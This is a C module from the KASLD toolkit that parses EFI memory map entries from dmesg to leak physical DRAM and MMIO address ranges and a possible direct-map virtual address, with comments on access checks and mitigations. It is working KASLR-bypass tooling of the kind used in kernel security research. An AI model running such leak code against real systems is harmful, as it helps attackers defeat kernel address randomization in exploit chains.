// This file is part of KASLD - https://github.com/bcoles/kasld
//
// EFI memory map entries are printed to dmesg when the kernel is booted
// with the `efi=debug` boot parameter. The format differs by architecture:
//
// ARM/ARM64/RISC-V (drivers/firmware/efi/efi-init.c):
//   efi:   0x000000000000-0x00000009ffff [Conventional Memory|  ...]
//
// x86 (arch/x86/platform/efi/efi.c):
//   efi: mem00: [Conventional Memory|  ...]
//   range=[0x0000000000000000-0x000000000009ffff] (0MB)
//
// Both formats require `efi=debug` (`efi_enabled(EFI_DBG)`), which is
// not commonly available on production systems.
//
// Leak primitive:
//   Data leaked:      physical memory map (EFI memory map entries)
//   Kernel subsystem: drivers/firmware/efi — efi_print_memmap()
//   Data structure:   EFI memory descriptor entries (physical address ranges)
//   Address type:     physical (DRAM + MMIO)
//   Method:           parsed (dmesg string)
//   Status:           unfixed (but requires efi=debug boot parameter)
//   Access check:     do_syslog() → check_syslog_permissions(); gated by
//                     dmesg_restrict
//   Source:
//   https://elixir.bootlin.com/linux/v6.12/source/drivers/firmware/efi/efi-init.c#L164
//
// Mitigations:
//   Requires efi=debug boot parameter (not set by default). Access
//   gated by dmesg_restrict (see dmesg.h for shared access gate details).
//   On decoupled architectures, physical addresses cannot derive the
//   virtual text base.
//
// Requires:
// - efi=debug kernel boot parameter.
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://elixir.bootlin.com/linux/v6.12/source/drivers/firmware/efi/efi-init.c#L164
// https://elixir.bootlin.com/linux/v6.12/source/arch/x86/platform/efi/efi.c#L353
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/dmesg.h"
#include "include/kasld.h"
#include "include/kasld_internal.h"
#include "include/kasld_types.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define range_ctx addr_range

KASLD_EXPLAIN(
    "Parses EFI memory map entries from dmesg (requires efi=debug boot "
    "parameter). Each entry lists a physical address range and its type "
    "(conventional memory, MMIO, runtime services, etc.). Extracts "
    "physical DRAM and MMIO ranges. Access is gated by dmesg_restrict.");

KASLD_META("method:parsed\n"
           "addr:physical\n"
           "sysctl:dmesg_restrict>=1\n"
           "bypass:CAP_SYSLOG\n"
           "fallback:/var/log/dmesg\n");

struct efi_ctx {
  struct range_ctx dram;
  struct range_ctx mmio;
};

static void update_range(struct range_ctx *r, unsigned long start,
                         unsigned long end) {
  if (start && (!r->lo || start < r->lo))
    r->lo = start;
  if (end > r->hi)
    r->hi = end;
}

/* Skip EFI MMIO entries — only RAM-type entries belong in DRAM results.
 * MMIO types: "MMIO" and "MMIO Port" (indices 11-12 in memory_type_name[]).
 * The type appears in brackets: "[MMIO ..." or "[MMIO Port...]". */
static int is_efi_mmio(const char *line) {
  const char *p = strchr(line, '[');
  if (!p)
    return 0;
  p++;
  return (strncmp(p, "MMIO", 4) == 0);
}

/* ARM/ARM64/RISC-V format: "  0x000000000000-0x00000009ffff [..." */
static int on_efi_init(const char *line, void *ctx) {
  struct efi_ctx *e = ctx;

  const char *p = strstr(line, "0x");
  if (!p)
    return 1;

  char *endptr;
  unsigned long start = strtoul(p, &endptr, 16);
  if (*endptr != '-')
    return 1;

  unsigned long end = strtoul(endptr + 1, &endptr, 16);
  if (!end)
    return 1;

  update_range(is_efi_mmio(line) ? &e->mmio : &e->dram, start, end);
  return 1; /* continue — multiple entries */
}

/* x86 format: "mem00: ... range=[0x...-0x...] (...MB)" */
static int on_efi_x86(const char *line, void *ctx) {
  struct efi_ctx *e = ctx;

  const char *p = strstr(line, "range=[");
  if (!p)
    return 1;

  p += 7; /* skip "range=[" */
  char *endptr;
  unsigned long start = strtoul(p, &endptr, 16);
  if (*endptr != '-')
    return 1;

  unsigned long end = strtoul(endptr + 1, &endptr, 16);
  if (!end)
    return 1;

  update_range(is_efi_mmio(line) ? &e->mmio : &e->dram, start, end);
  return 1; /* continue — multiple entries */
}

int main(void) {
  struct efi_ctx e = {{0, 0}, {0, 0}};

  printf("[.] searching dmesg for EFI memory map (requires efi=debug) ...\n");

  /* ARM/ARM64/RISC-V format: lines start with "efi:   0x" */
  int ds = dmesg_search("efi:   0x", on_efi_init, &e);
  if (ds < 0)
    return KASLD_EXIT_NOPERM;

  /* x86 format: "efi: mem00: ... range=[0x...-0x...]" */
  if (!e.dram.lo && !e.mmio.lo)
    dmesg_search("efi: mem", on_efi_x86, &e);

  if (!e.dram.lo && !e.mmio.lo) {
    printf("[-] EFI memory map not found in dmesg\n");
    printf("    (requires efi=debug kernel boot parameter)\n");
    return 0;
  }

  if (e.dram.lo) {
    printf("lowest EFI RAM address:  0x%016lx\n", e.dram.lo);
    printf("highest EFI RAM address: 0x%016lx\n", e.dram.hi);

    /* DRAM-typed EFI memmap entries describe usable system RAM ranges,
     * so the boundary addresses map to RAM_BASE / RAM_TOP. The
     * efi_memmap data structure itself is a separate concept (handled by
     * sysfs_efi_memmap if/when added). */
    kasld_result(KASLD_ADDR_PHYS, KASLD_SECTION_DRAM, e.dram.lo,
                 KASLD_REGION_RAM_BASE, NULL);

    if (e.dram.hi && e.dram.hi != e.dram.lo)
      kasld_result(KASLD_ADDR_PHYS, KASLD_SECTION_DRAM, e.dram.hi,
                   KASLD_REGION_RAM_TOP, NULL);
  }

  if (e.mmio.lo) {
    printf("lowest EFI MMIO address:  0x%016lx\n", e.mmio.lo);
    printf("highest EFI MMIO address: 0x%016lx\n", e.mmio.hi);

    kasld_result(KASLD_ADDR_PHYS, KASLD_SECTION_MMIO, e.mmio.lo,
                 KASLD_REGION_MMIO, NULL);

    if (e.mmio.hi && e.mmio.hi != e.mmio.lo)
      kasld_result(KASLD_ADDR_PHYS, KASLD_SECTION_MMIO, e.mmio.hi,
                   KASLD_REGION_MMIO, NULL);
  }

#if !PHYS_VIRT_DECOUPLED
  if (e.dram.lo) {
    unsigned long virt = phys_to_virt(e.dram.lo);
    printf("possible direct-map virtual address: 0x%016lx\n", virt);
    kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DIRECTMAP, virt,
                 KASLD_REGION_RAM_BASE, NULL);
  }
#else
  printf("note: phys and virt KASLR are decoupled on this arch; "
         "cannot derive kernel text virtual address from physical leak\n");
#endif

  return 0;
}
